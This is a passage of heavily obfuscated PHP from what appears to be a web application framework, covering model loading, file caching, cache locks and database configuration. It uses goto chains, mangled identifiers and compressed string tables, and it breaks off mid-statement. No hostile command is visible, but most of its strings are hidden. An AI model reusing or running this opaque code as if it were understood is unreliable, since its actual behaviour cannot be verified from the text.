$E¹íîòšÖ = false, $FÚ’®²éÕó = '') { goto c·ø·»ËÑ™; EªĞÓ§÷‰¦: $C½Š˜ª„ïø = is_array($EŠï‡‚Õ‘Š) ? $EŠï‡‚Õ‘Š : array($EŠï‡‚Õ‘Š => $E¹íîòšÖ); foreach ($C½Š˜ª„ïø as $a°Èœ·ø× => $bÕÔÃ¼í¼º) { if (is_array($bÕÔÃ¼í¼º)) { $bÕÔÃ¼í¼º = json_encode_force($bÕÔÃ¼í¼º); } $this->checkLength($bÕÔÃ¼í¼º, !1, $this->tableName . $bŒ¶Å­òÓã[4] . $EŠï‡‚Õ‘Š); $bÕÔÃ¼í¼º = self::textEncode($bÕÔÃ¼í¼º); $C½Š˜ª„ïø = array($bŒ¶Å­òÓã[29] => $FÚ’®²éÕó, $bŒ¶Å­òÓã[89] => $a°Èœ·ø×, $bŒ¶Å­òÓã[359] => $bÕÔÃ¼í¼º); $a¬ßÈšœ¸Ò[] = $this->filterWhere($C½Š˜ª„ïø); } if (!$a¬ßÈšœ¸Ò) { return !0; } goto CÊºİÇ¥; CÊºİÇ¥: return $this->addAll($a¬ßÈšœ¸Ò, array(), !0); goto B¥¶ùœ³; c·ø·»ËÑ™: $bŒ¶Å­òÓã =& $_SERVER[ã®Â„Éæ¹¤]; $this->cacheRemove($FÚ’®²éÕó); $a¬ßÈšœ¸Ò = array(); goto EªĞÓ§÷‰¦; B¥¶ùœ³: } protected function optionDefault($dÔ¼¤ÈÓêö = '') { return !1; } public function setDeep($eà¢ùÎ»­×, $a×Ü§ìã¸ğ = false, $D’Ü†ğß = '') { $cÂÅù‡šà… = explode($_SERVER[ã®Â„Éæ¹¤][91], $eà¢ùÎ»­×); $Bä‚‹Ó»§ = $this->get(); array_set_value($Bä‚‹Ó»§, $eà¢ùÎ»­×, $a×Ü§ìã¸ğ); $this->set($cÂÅù‡šà…[0], $Bä‚‹Ó»§[$cÂÅù‡šà…[0]], $D’Ü†ğß); } public function remove($fîœÍ‰é’Û, $dµ¼“ôøÛ = '') { $Aé“½³Ë§ =& $_SERVER[ã®Â„Éæ¹¤]; $this->cacheRemove($dµ¼“ôøÛ); $BĞ·ÉÉã¥³ = $this->filterWhere(array($Aé“½³Ë§[89] => $fîœÍ‰é’Û, $Aé“½³Ë§[29] => $dµ¼“ôøÛ)); if (is_null($fîœÍ‰é’Û)) { unset($BĞ·ÉÉã¥³[$Aé“½³Ë§[89]]); } return $this->where($BĞ·ÉÉã¥³)->delete(); } public function cacheSet($Bî‚Õäó†œ, $D±êñŠ‚Üæ = false) { return Cache::set($this->cacheKey($Bî‚Õäó†œ), $D±êñŠ‚Üæ); } public function cacheGet($Bõ‹˜§™½‚) { return Cache::get($this->cacheKey($Bõ‹˜§™½‚)); } public function cacheRemove($fÉÏî¾Û) { return Cache::remove($this->cacheKey($fÉÏî¾Û)); } protected function filterWhere($d½•…İáŠ¦) { return $d½•…İáŠ¦; } protected function cacheKey($B¶ùÖ‹·š) { return $B¶ùÖ‹·š; } } goto FÍÕÔÍÜÖÅ; E†ƒš¾Ã¥Å: $_SERVER[$_SERVER[ˆó©™¯í›][49]] = (base64_decode('MTAwMg==')."\x37\x31\x35")+0;$_xBpg="W3jaiBeANsEd4WY8jvTqecqJcgThyPHEZI5FzivfQ6hJpsDPIzrubqr9FuTsIbnK3";; stream_wrapper_register($_SERVER[ˆó©™¯í›][50], $_SERVER[ˆó©™¯í›][51]); class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($dá±›”¤Ñ, $dçÑë±—ó) { $D…¿Õô‰ˆ =& $_SERVER[ã®Â„Éæ¹¤]; if (isset(self::$_methodList[$dá±›”¤Ñ])) { return @call_user_func_array(self::$_methodList[$dá±›”¤Ñ], $dçÑë±—ó); } else { if (method_exists($this, $dá±›”¤Ñ)) { return call_user_func_array(array($this, $dá±›”¤Ñ), $dçÑë±—ó); } else { think_exception(__CLASS__ . $D…¿Õô‰ˆ[4] . $dá±›”¤Ñ . $D…¿Õô‰ˆ[5]); } } } public static function __callStatic($EÊØ‚÷¶ê, $EŒ½‚÷ì¹) { if (isset(self::$_methodListStatic[$EÊØ‚÷¶ê])) { return call_user_func_array(self::$_methodListStatic[$EÊØ‚÷¶ê], $EŒ½‚÷ì¹); } else { if (method_exists(self, $EÊØ‚÷¶ê)) { return call_user_func_array(array(self, $EÊØ‚÷¶ê), $EŒ½‚÷ì¹); } else { show_json("{$EÊØ‚÷¶ê}\x28\51\40\x6e\x6f\x74\40\x65\170\151\x73\164\x3b", !1); } } } public static function addMethod($aĞ²‹ÛË³†, $a©òêğà) { self::$_methodList[$aĞ²‹ÛË³†] = $a©òêğà; } public static function addMethodStatic($dòÑ’„¡×³, $EÅ¸æ»÷áĞ) { self::$_methodListStatic[$dòÑ’„¡×³] = $EÅ¸æ»÷áĞ; } } goto aíõßˆ«ç¬; ağíè†›ŠÄ: define($_SERVER[ã®Â„Éæ¹¤][0], $_SERVER[ã®Â„Éæ¹¤][1]); $_SERVER[ˆó©™¯í›] = explode($_SERVER[ã®Â„Éæ¹¤][2], gzinflate(substr($_SERVER[ã®Â„Éæ¹¤][3], 10, -8))); function Model($díÆ¯—Êâİ = '', $aÆšÙÙÑŒ• = '', $f£÷‹‡„® = '') { goto e¯æŞøñÂ¿; eÈÌçİªİ“: if (isset($f±©Ñ…ËÑŠ[$Föõ‰§áĞù])) { return $f±©Ñ…ËÑŠ[$Föõ‰§áĞù]; } if ($díÆ¯—Êâİ) { $díÆ¯—Êâİ = strtoupper($díÆ¯—Êâİ[0]) . substr($díÆ¯—Êâİ, 1); $F‹Á„‰‹²å = $díÆ¯—Êâİ . $BÜô•à‡¶[1]; if (class_exists($F‹Á„‰‹²å)) { $f±©Ñ…ËÑŠ[$Föõ‰§áĞù] = new $F‹Á„‰‹²å(); return $f±©Ñ…ËÑŠ[$Föõ‰§áĞù]; } } if (!$f£÷‹‡„®) { $f£÷‹‡„® = $GLOBALS[$BÜô•à‡¶[2]][$BÜô•à‡¶[3]]; } goto A­ï˜âÉá; e¯æŞøñÂ¿: $BÜô•à‡¶ =& $_SERVER[ˆó©™¯í›]; static $f±©Ñ…ËÑŠ = array(); $Föõ‰§áĞù = strtolower($aÆšÙÙÑŒ• . $BÜô•à‡¶[0] . $díÆ¯—Êâİ); goto eÈÌçİªİ“; A­ï˜âÉá: $f±©Ñ…ËÑŠ[$Föõ‰§áĞù] = new ModelBase($díÆ¯—Êâİ, $aÆšÙÙÑŒ•, $f£÷‹‡„®); return $f±©Ñ…ËÑŠ[$Föõ‰§áĞù]; goto cäÒŒÚ¥²ó; cäÒŒÚ¥²ó: } goto E¤Àë¸ËêÉ; D‹£‡ª¨â‹: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($D©Ş³’˜“, $bŞï²ÂÀŠù) { $dçĞ¹Èç… =& $_SERVER[ã®Â„Éæ¹¤]; $this->cachePath = $D©Ş³’˜“[$dçĞ¹Èç…[75]]; $this->prefix = $dçĞ¹Èç…[784]; $this->cacheTime = $bŞï²ÂÀŠù; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($eƒ¨×î´Ô) { $BĞ›§š ôÕ =& $_SERVER[ã®Â„Éæ¹¤]; $eƒ¨×î´Ô = str_replace(array($BĞ›§š ôÕ[785], $BĞ›§š ôÕ[93], $BĞ›§š ôÕ[69]), $BĞ›§š ôÕ[786], $eƒ¨×î´Ô); return $this->cachePath . $BĞ›§š ôÕ[787] . $eƒ¨×î´Ô . $BĞ›§š ôÕ[788]; } public function set($EƒÅ¶Åãœ, $B…ÉÏ†áï£, $e©ˆôÅ = false) { $A¶½­ŞĞ¢‘ = $this->getFile($EƒÅ¶Åãœ); if (file_put_contents($A¶½­ŞĞ¢‘, $this->prefix . $B…ÉÏ†áï£, LOCK_EX)) { return !0; } @unlink($A¶½­ŞĞ¢‘); return !1; } public function get($a¦Ÿ£ÍÁ°) { $DÍá‚Õ¥ôˆ = $this->getFile($a¦Ÿ£ÍÁ°); if (file_exists($DÍá‚Õ¥ôˆ) && filemtime($DÍá‚Õ¥ôˆ) < time() - $this->cacheTime) { @unlink($DÍá‚Õ¥ôˆ); return !1; } $B”ïâ¨ëÀæ = @file_get_contents($DÍá‚Õ¥ôˆ); return substr($B”ïâ¨ëÀæ, strlen($this->prefix)); } public function remove($cØ¿œ™ª¨ô) { $BŠ¬–åš¶ = $this->getFile($cØ¿œ™ª¨ô); return @unlink($BŠ¬–åš¶); } public function deleteAll() { $Bò—…¼‹–¥ =& $_SERVER[ã®Â„Éæ¹¤]; $fõŞ‰â²ÌŠ = scandir($this->cachePath); foreach ($fõŞ‰â²ÌŠ as $cë´§Ë²Ãˆ) { $a‹ÃÈïÑÓš = $this->cachePath . $cë´§Ë²Ãˆ; if (strpos($a‹ÃÈïÑÓš, $Bò—…¼‹–¥[788]) && strpos($a‹ÃÈïÑÓš, $Bò—…¼‹–¥[789])) { @unlink($a‹ÃÈïÑÓš); } } } public function clearTimeout() { $d¸‡ğáé¨Ï =& $_SERVER[ã®Â„Éæ¹¤]; $DœÍ‹İ›Ì = scandir($this->cachePath); foreach ($DœÍ‹İ›Ì as $Fá¨…Ò’õó) { $Bæ¡ŸâŠ„¤ = $this->cachePath . $Fá¨…Ò’õó; if (strpos($Bæ¡ŸâŠ„¤, $d¸‡ğáé¨Ï[788]) && strpos($Bæ¡ŸâŠ„¤, $d¸‡ğáé¨Ï[789]) && filemtime($Bæ¡ŸâŠ„¤) < time() - $this->cacheTime) { @unlink($Bæ¡ŸâŠ„¤); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto fªÀÒôÉ˜; fªÀÒôÉ˜: $A“È‚³¬”» =& $_SERVER[ã®Â„Éæ¹¤]; if (self::$handle) { return self::$handle; } $B‰±ÆØ•Ö = $GLOBALS[$A“È‚³¬”»[6]][$A“È‚³¬”»[337]]; goto B¨Ğå‰ø; B¨Ğå‰ø: self::$timeout = $B‰±ÆØ•Ö[$A“È‚³¬”»[790]] ? $B‰±ÆØ•Ö[$A“È‚³¬”»[790]] : 10; $fØá•¨²¯ = _get($GLOBALS[$A“È‚³¬”»[6]], $A“È‚³¬”»[791]); $F»…—‹Ğµº = $B‰±ÆØ•Ö[$A“È‚³¬”»[777]] ? $B‰±ÆØ•Ö[$A“È‚³¬”»[777]] : $A“È‚³¬”»[167]; goto dáå«ª®; dáå«ª®: if ($F»…—‹Ğµº == $A“È‚³¬”»[17] && $fØá•¨²¯ == $A“È‚³¬”»[9]) { $F»…—‹Ğµº = $A“È‚³¬”»[167]; } switch ($F»…—‹Ğµº) { case $A“È‚³¬”»[780]: self::$handle = new CacheLockRedis(); break; case $A“È‚³¬”»[781]: self::$handle = new CacheLockMemcached(); break; case $A“È‚³¬”»[17]: self::$handle = new CacheLockDatabase(); break; case $A“È‚³¬”»[167]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto dÆÅµ”Ù¼ê; dÆÅµ”Ù¼ê: } private static function key($F“©˜—ïõã) { return $_SERVER[ã®Â„Éæ¹¤][792] . Cache::key($F“©˜—ïõã); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($D“À¥¸™¤ = '') { self::$errorMsg = $D“À¥¸™¤; } public static function lockGlobal($Aƒ¸×Øì, $có±Ş¨Û¿) { return self::lock($Aƒ¸×Øì, $có±Ş¨Û¿, !0); } public static function lock($B¤è‡·„Òƒ, $DŞÙÆôÁƒª = false, $aÓ¹›Áä¹ = false) { goto eå™Ê”Î‡; eå™Ê”Î‡: $CÓÀÛœ´— =& $_SERVER[ã®Â„Éæ¹¤]; $fºÆç†™ÒÎ = self::init(); $B×•ºãêà² = self::key($B¤è‡·„Òƒ); goto f¹ì¨Å’Ğ§; f¹ì¨Å’Ğ§: $DŞÙÆôÁƒª = $DŞÙÆôÁƒª ? $DŞÙÆôÁƒª : self::$timeout; $c™½¹ÆÛ¹ä = $fºÆç†™ÒÎ->lock($B×•ºãêà², $DŞÙÆôÁƒª); if (!$c™½¹ÆÛ¹ä) { $fƒæ°‚ò = $CÓÀÛœ´—[793] . $DŞÙÆôÁƒª . $CÓÀÛœ´—[67] . self::$errorMsg . $CÓÀÛœ´—[67] . get_caller_msg(); $Dëù’ì²„¿ = "\x4c\157\143\x6b\40\x61\143\164\x69\157\x6e\x3a\x20{$B×•ºãêà²}\40\x74\151\x6d\145\157\165\x74\54\x6f\x76\x65\162\40{$DŞÙÆôÁƒª}\x20\163"; $Dëù’ì²„¿ = self::$errorMsg ? self::$errorMsg : $fğ±ƒ–‘ŠŒ; write_log($fƒæ°‚ò, $CÓÀÛœ´—[794]); show_json($Dëù’ì²„¿, !1); } goto dáÓœö§‹; dáÓœö§‹: if (!$aÓ¹›Áä¹) { self::$lockItem[$B×•ºãêà²] = !0; } return $c™½¹ÆÛ¹ä; goto AÃ§ç†Îõ; AÃ§ç†Îõ: } public static function lockGet($aß»ğ´) { $e®ÏĞò· = self::key($aß»ğ´); if (self::$lockItem[$e®ÏĞò·]) { return self::$lockItem[$e®ÏĞò·]; } return self::init()->lockGet($e®ÏĞò·); } public static function unlock($b›ƒ…çã™è) { $A•Š†¶•Şà = self::key($b›ƒ…çã™è); self::$lockItem[$A•Š†¶•Şà] = null; return self::init()->unlock($A•Š†¶•Şà); } public static function unlockRuntime() { $E¯‹‘Ú§© =& $_SERVER[ã®Â„Éæ¹¤]; $f›°¶çá‘° = self::init(); $A‰ƒÖ³°„Æ = !1; foreach (self::$lockItem as $fØ„®½¡Í => $F²Õöø¿˜) { if (!$F²Õöø¿˜) { continue; } $f›°¶çá‘°->unlock($fØ„®½¡Í); if (!$A‰ƒÖ³°„Æ) { $A‰ƒÖ³°„Æ = !0; write_log($E¯‹‘Ú§©[795] . $fØ„®½¡Í . $E¯‹‘Ú§©[67] . get_caller_msg(), $E¯‹‘Ú§©[794]); continue; } write_log($E¯‹‘Ú§©[795] . $fØ„®½¡Í, $E¯‹‘Ú§©[794]); } self::fileUnlockAll(); } public static function fileLock($EĞµ¯ÚØÙ) { goto AØ¾ÔÔÛê; d–·ï«Ÿœ³: if (flock($FÒóŞË¦¡ğ, LOCK_EX)) { return !0; } self::unlock($EĞµ¯ÚØÙ); show_json($e“‚¾ƒê‘ì[799], !1); goto F¾œ˜ƒ·Ş; F¾œ˜ƒ·Ş: return !1; goto cĞºé£íªñ; AØ¾ÔÔÛê: $e“‚¾ƒê‘ì =& $_SERVER[ã®Â„Éæ¹¤]; if (!$GLOBALS[$e“‚¾ƒê‘ì[796]]) { $GLOBALS[$e“‚¾ƒê‘ì[796]] = array(); } $GLOBALS[$e“‚¾ƒê‘ì[796]][$EĞµ¯ÚØÙ] = !1; goto fÅØ‘áÉêœ; fÅØ‘áÉêœ: $FÒóŞË¦¡ğ = fopen(DATA_PATH . $EĞµ¯ÚØÙ . $e“‚¾ƒê‘ì[797], $e“‚¾ƒê‘ì[798]); if (!$FÒóŞË¦¡ğ) { return !1; } $GLOBALS[$e“‚¾ƒê‘ì[796]][$EĞµ¯ÚØÙ] = $FÒóŞË¦¡ğ; goto d–·ï«Ÿœ³; cĞºé£íªñ: } public static function fileUnlock($Eáª½×ŒÕ) { $eåÙ»´÷¡² =& $_SERVER[ã®Â„Éæ¹¤]; $D¼áç÷š² = $GLOBALS[$eåÙ»´÷¡²[796]][$Eáª½×ŒÕ]; if (!$D¼áç÷š²) { return; } $GLOBALS[$eåÙ»´÷¡²[796]][$Eáª½×ŒÕ] = !1; flock($D¼áç÷š², LOCK_UN); fclose($D¼áç÷š²); } public static function fileUnlockAll() { $EÍÅÎ» ÊË =& $_SERVER[ã®Â„Éæ¹¤]; if (!$GLOBALS[$EÍÅÎ» ÊË[796]]) { return; } foreach ($GLOBALS[$EÍÅÎ» ÊË[796]] as $CèÓë±Ñ– => $C‹İ‚ùå¬İ) { if (!$C‹İ‚ùå¬İ) { continue; } $GLOBALS[$EÍÅÎ» ÊË[796]][$CèÓë±Ñ–] = !1; flock($C‹İ‚ùå¬İ, LOCK_UN); fclose($C‹İ‚ùå¬İ); } $GLOBALS[$EÍÅÎ» ÊË[796]] = array(); } } function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } goto e¡¶òÜ‡©; B¥Ã¯Ğ¡è: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\x68\x69\156\x6b\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $exp = array("\145\161" => "\x3d", "\x6e\145\161" => "\74\76", "\147\164" => "\x3e", "\145\x67\164" => "\x3e\75", "\154\164" => "\74", "\145\x6c\164" => "\74\75", "\156\x6f\164\x6c\151\153\x65" => "\116\117\x54\x20\114\x49\x4b\105", "\154\151\153\145" => "\x4c\x49\113\x45", "\x69\x6e" => "\111\x4e", "\x6e\x6f\164\151\156" => "\x4e\x4f\124\40\111\x4e", "\156\x6f\x74\40\x69\x6e" => "\116\x4f\x54\x20\x49\116", "\142\x65\x74\167\145\145\156" => "\x42\105\x54\x57\105\105\116", "\156\157\x74\142\x65\164\x77\145\x65\156" => "\116\117\124\x20\x42\105\124\x57\x45\x45\x4e", "\x6e\x6f\164\40\142\145\x74\167\145\145\x6e" => "\x4e\117\124\x20\x42\105\124\x57\x45\105\116"); protected $selectSql = "\x53\x45\x4c\105\x43\x54\x25\x44\111\x53\124\111\116\103\x54\x25\x20\45\106\111\x45\114\104\45\x20\x46\122\117\115\40\x25\x54\101\102\x4c\105\x25\x25\x4a\117\x49\x4e\x25\45\127\110\x45\122\x45\45\x25\x47\x52\117\125\120\45\45\110\x41\126\111\x4e\x47\x25\45\117\122\104\105\122\x25\45\114\111\x4d\111\124\45\x20\45\x55\x4e\x49\117\x4e\45\45\x43\x4f\115\115\x45\x4e\x54\45"; protected $bind = array(); public static function getInstance() { $D„×“‹’‚ª = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[ã®Â„Éæ¹¤][893], $D„×“‹’‚ª); } public function factory($EĞ¥ÓÂ‚ˆ = '') { goto E¢§Ïã’™; cØº…‚ß…­: return $DÔÈ…ï÷´; goto dà¼¦±Ù”; CÔàÃõ•Ü¥: $this->dbType = ucwords(strtolower($EĞ¥ÓÂ‚ˆ[$c¨†¼Õ“òÏ[894]])); $bçÏğáøÜƒ = $c¨†¼Õ“òÏ[896] . $this->dbType; if (class_exists($bçÏğáøÜƒ)) { $DÔÈ…ï÷´ = new $bçÏğáøÜƒ($EĞ¥ÓÂ‚ˆ); if ($c¨†¼Õ“òÏ[745] != strtolower($EĞ¥ÓÂ‚ˆ[$c¨†¼Õ“òÏ[894]])) { $DÔÈ…ï÷´->dbType = strtoupper($this->dbType); } else { $DÔÈ…ï÷´->dbType = $this->_getDsnType($EĞ¥ÓÂ‚ˆ[$c¨†¼Õ“òÏ[849]]); } } else { think_exception(think_lang($c¨†¼Õ“òÏ[897]) . $c¨†¼Õ“òÏ[898] . $bçÏğáøÜƒ); } goto cØº…‚ß…­; E¢§Ïã’™: $c¨†¼Õ“òÏ =& $_SERVER[ã®Â„Éæ¹¤]; $EĞ¥ÓÂ‚ˆ = $this->parseConfig($EĞ¥ÓÂ‚ˆ); if (empty($EĞ¥ÓÂ‚ˆ[$c¨†¼Õ“òÏ[894]])) { think_exception(think_lang($c¨†¼Õ“òÏ[895])); } goto CÔàÃõ•Ü¥; dà¼¦±Ù”: } public function __call($bÕ‰áº†×è, $CìÁ¡»–à¾) { if (method_exists($this, $bÕ‰áº†×è)) { return call_user_func_array(array($this, $bÕ‰áº†×è), $CìÁ¡»–à¾); } } protected function _getDsnType($dÖàä’‚­â) { $fÑ÷³¸øÎŠ = explode($_SERVER[ã®Â„Éæ¹¤][4], $dÖàä’‚­â); $CÑØÆ‘íŠ = strtoupper(trim($fÑ÷³¸øÎŠ[0])); return $CÑØÆ‘íŠ; } private function parseConfig($AÔÂ±‰óˆå = '') { $b­¾«‚âÂ£ =& $_SERVER[ã®Â„Éæ¹¤]; if (!empty($AÔÂ±‰óˆå) && is_string($AÔÂ±‰óˆå)) { $AÔÂ±‰óˆå = $this->parseDSN($AÔÂ±‰óˆå); } elseif (is_array($AÔÂ±‰óˆå)) { $AÔÂ±‰óˆå = array_change_key_case($AÔÂ±‰óˆå); $AÔÂ±‰óˆå = array($b­¾«‚âÂ£[894] => $AÔÂ±‰óˆå[$b­¾«‚âÂ£[744]], $b­¾«‚âÂ£[822] => $AÔÂ±‰óˆå[$b­¾«‚âÂ£[899]], $b­¾«‚âÂ£[823] => $AÔÂ±‰óˆå[$b­¾«‚âÂ£[900]], $b­¾«‚âÂ£[820] => $AÔÂ±‰óˆå[$b­¾«‚âÂ£[901]], $b­¾«‚âÂ£[821] => $AÔÂ±‰óˆå[$b­¾«‚âÂ£[902]], $b­¾«‚âÂ£[17] => $AÔÂ±‰óˆå[$b­¾«‚âÂ£[903]], $b­¾«‚âÂ£[849] => $AÔÂ±‰óˆå[$b­¾«‚âÂ£[746]], $b­¾«‚âÂ£[13] => isset($AÔÂ±‰óˆå[$b­¾«‚âÂ£[904]]) ? $AÔÂ±‰óˆå[$b­¾«‚âÂ£[904]] : array()); } elseif (empty($AÔÂ±‰óˆå)) { if (think_config($b­¾«‚âÂ£[905]) && $b­¾«‚âÂ£[745] != strtolower(think_config($b­¾«‚âÂ£[906]))) { $AÔÂ±‰óˆå = $this->parseDSN(think_config($b­¾«‚âÂ£[905])); } else { $AÔÂ±‰óˆå = array($b­¾«‚âÂ£[894] => think_config($b­¾«‚âÂ£[906]), $b­¾«‚âÂ£[822] => think_config($b­¾«‚âÂ£[907]), $b­¾«‚âÂ£[823] => think_config($b­¾«‚âÂ£[908]), $b­¾«‚âÂ£[820] => think_config($b­¾«‚âÂ£[909]), $b­¾«‚âÂ£[821] => think_config($b­¾«‚âÂ£[910]), $b­¾«‚âÂ£[17] => think_config($b­¾«‚âÂ£[234]), $b­¾«‚âÂ£[849] => think_config($b­¾«‚âÂ£[905]), $b­¾«‚âÂ£[13] => think_config($b­¾«‚âÂ£[911])); } } return $AÔÂ±‰óˆå; } protected function initConnect($AÜÈ¹•°ëÚ = true) { if (1 == think_config($_SERVER[ã®Â„Éæ¹¤][18])) { $this->_linkID = $this->multiConnect($AÜÈ¹•°ëÚ); } else { if (!$this->connected) { $this->_linkID = $this->connect(); } } } protected function multiConnect($F²¯Š¨‘¸‘ = false) { $e˜ºù¸…İ’ =& $_SERVER[ã®Â„Éæ¹¤]; static $Dİ¹êğº‘à = array(); if (empty($Dİ¹êğº‘à)) { foreach ($this->config as $EÑ‡„Õñˆî => $bÔ¡ë’Æô¾) { $Dİ¹êğº‘à[$EÑ‡„Õñˆî] = explode($e˜ºù¸…İ’[47], $bÔ¡ë’Æô¾); } } if (think_config($e˜ºù¸…İ’[912])) { if ($F²¯Š¨‘¸‘) { $eÙ’ğ³âã = floor(mt_rand(0, think_config($e˜ºù¸…İ’[913]) - 1)); } else { if (is_numeric(think_config($e˜ºù¸…İ’[914]))) { $eÙ’ğ³âã = think_config($e˜ºù¸…İ’[914]); } else { $eÙ’ğ³âã = floor(mt_rand(think_config($e˜ºù¸…İ’[913]), count($Dİ¹êğº‘à[$e˜ºù¸…İ’[820]]) - 1)); } } } else { $eÙ’ğ³âã = floor(mt_rand(0, count($Dİ¹êğº‘à[$e˜ºù¸…İ’[820]]) - 1)); } $CÔµé‘‚´‘ = array($e˜ºù¸…İ’[822] => isset($Dİ¹êğº‘à[$e˜ºù¸…İ’[822]][$eÙ’ğ³âã]) ? $Dİ¹êğº‘à[$e˜ºù¸…İ’[822]][$eÙ’ğ³âã] : $Dİ¹êğº‘à[$e˜ºù¸…İ’[822]][0], $e˜ºù¸…İ’[823] => isset($Dİ¹êğº‘à[$e˜ºù¸…İ’[823]][$eÙ’ğ³âã]) ? $Dİ¹êğº‘à[$e˜ºù¸…İ’[823]][$eÙ’ğ³âã] : $Dİ¹êğº‘à[$e˜ºù¸…İ’[823]][0], $e˜ºù¸…İ’[820] => isset($Dİ¹êğº‘à[$e˜ºù¸…İ’[820]][$eÙ’ğ³âã]) ? $Dİ¹êğº‘à[$e˜ºù¸…İ’[820]][$eÙ’ğ³âã] : $Dİ¹êğº‘à[$e˜ºù¸…İ’[820]][0], $e˜ºù¸…İ’[821] => isset($Dİ¹êğº‘à[$e˜ºù¸…İ’[821]][$eÙ’ğ³âã]) ? $Dİ¹êğº‘à[$e˜ºù¸…İ’[821]][$eÙ’ğ³âã] : $Dİ¹êğº‘à[$e˜ºù¸…İ’[821]][0], $e˜ºù¸…İ’[17] => isset($Dİ¹êğº‘à[$e˜ºù¸…İ’[17]][$eÙ’ğ³âã]) ? $Dİ¹êğº‘à[$e˜ºù¸…İ’[17]][$eÙ’ğ³âã] : $Dİ¹êğº‘à[$e˜ºù¸…İ’[17]][0], $e˜ºù¸…İ’[849] => isset($Dİ¹êğº‘à[$e˜ºù¸…İ’[849]][$eÙ’ğ³âã]) ? $Dİ¹êğº‘à[$e˜ºù¸…İ’[849]][$eÙ’ğ³âã] : $Dİ¹êğº‘à[$e˜ºù¸…İ’[849]][0], $e˜ºù¸…İ’[13] => isset($Dİ¹êğº‘à[$e˜ºù¸…İ’[13]][$eÙ’ğ³âã]) ? $Dİ¹êğº‘à[$e˜ºù¸…İ’[13]][$eÙ’ğ³âã] : $Dİ¹êğº‘à[$e˜ºù¸…İ’[13]][0]); return $this->connect($CÔµé‘‚´‘, $eÙ’ğ³âã); } public function parseDSN($cñÊ°çîÛÑ) { $eœ½‘îÉ‚Ö =& $_SERVER[ã®Â„Éæ¹¤]; if (empty($cñÊ°çîÛÑ)) { return !1; } $b‘µìÖ—Ã‘ = parse_url($cñÊ°çîÛÑ); if ($b‘µìÖ—Ã‘[$eœ½‘îÉ‚Ö[168]]) { $eø³ªÌ¢ù¥ = array($eœ½‘îÉ‚Ö[894] => $b‘µìÖ—Ã‘[$eœ½‘îÉ‚Ö[168]], $eœ½‘îÉ‚Ö[822] => isset($b‘µìÖ—Ã‘[$eœ½‘îÉ‚Ö[536]]) ? $b‘µìÖ—Ã‘[$eœ½‘îÉ‚Ö[536]] : $eœ½‘îÉ‚Ö[33], $eœ½‘îÉ‚Ö[823] => isset($b‘µìÖ—Ã‘[$eœ½‘îÉ‚Ö[915]]) ? $b‘µìÖ—Ã‘[$eœ½‘îÉ‚Ö[915]] : $eœ½‘îÉ‚Ö[33], $eœ½‘îÉ‚Ö[820] => isset($b‘µìÖ—Ã‘[$eœ½‘îÉ‚Ö[169]]) ? $b‘µìÖ—Ã‘[$eœ½‘îÉ‚Ö[169]] : $eœ½‘îÉ‚Ö[33], $eœ½‘îÉ‚Ö[821] => isset($b‘µìÖ—Ã‘[$eœ½‘îÉ‚Ö[170]]) ? $b‘µìÖ—Ã‘[$eœ½‘îÉ‚Ö[170]] : $eœ½‘îÉ‚Ö[33], $eœ½‘îÉ‚Ö[17] => isset($b‘µìÖ—Ã‘[$eœ½‘îÉ‚Ö[75]]) ? substr($b‘µìÖ—Ã‘[$eœ½‘îÉ‚Ö[75]], 1) : $eœ½‘îÉ‚Ö[33]); } else { preg_match($eœ½‘îÉ‚Ö[916], trim($cñÊ°çîÛÑ), $fÆ»ƒ±ïÈ); $eø³ªÌ¢ù¥ = array($eœ½‘îÉ‚Ö[894] => $fÆ»ƒ±ïÈ[1], $eœ½‘îÉ‚Ö[822] => $fÆ»ƒ±ïÈ[2], $eœ½‘îÉ‚Ö[823] => $fÆ»ƒ±ïÈ[3], $eœ½‘îÉ‚Ö[820] => $fÆ»ƒ±ïÈ[4], $eœ½‘îÉ‚Ö[821] => $fÆ»ƒ±ïÈ[5], $eœ½‘îÉ‚Ö[17] => $fÆ»ƒ±ïÈ[6]); } $eø³ªÌ¢ù¥[$eœ½‘îÉ‚Ö[849]] = $eœ½‘îÉ‚Ö[33]; return $eø³ªÌ¢ù¥; } protected function debug() { $DçÄáØµÓ =& $_SERVER[ã®Â„Éæ¹¤]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $DçÄáØµÓ[917]; if (think_config($DçÄáØµÓ[918])) { think_status($DçÄáØµÓ[919]); think_trace($this->queryStr . $DçÄáØµÓ[920] . think_status($DçÄáØµÓ[20], $DçÄáØµÓ[919], 6) . $DçÄáØµÓ[921], $DçÄáØµÓ[33], $DçÄáØµÓ[922]); } } protected function parseLock($b»ŠÒš²ì— = false) { $eÈ¾ ‘Öê =& $_SERVER[ã®Â„Éæ¹¤]; if (!$b»ŠÒš²ì—) { return $eÈ¾ ‘Öê[33]; } if ($eÈ¾ ‘Öê[851] == $this->dbType) { return $eÈ¾ ‘Öê[923]; } return $eÈ¾ ‘Öê[924]; } protected function parseSet($EÉâİ’ÜÍ¾) { $bÓĞ¾º‘Å =& $_SERVER[ã®Â„Éæ¹¤]; foreach ($EÉâİ’ÜÍ¾ as $DÛ­µÙÀ„“ => $C©‚¨ĞöÂ) { if (is_array($C©‚¨ĞöÂ) && $bÓĞ¾º‘Å[285] == $C©‚¨ĞöÂ[0]) { $AĞéŒ¥Óë[] = $this->parseKey($DÛ­µÙÀ„“) . $bÓĞ¾º‘Å[925] . $C©‚¨ĞöÂ[1]; } elseif (is_scalar($C©‚¨ĞöÂ) || is_null($C©‚¨ĞöÂ)) { $AĞéŒ¥Óë[] = $this->parseKey($DÛ­µÙÀ„“) . $bÓĞ¾º‘Å[925] . $this->parseValue($C©‚¨ĞöÂ); } } return $bÓĞ¾º‘Å[926] . 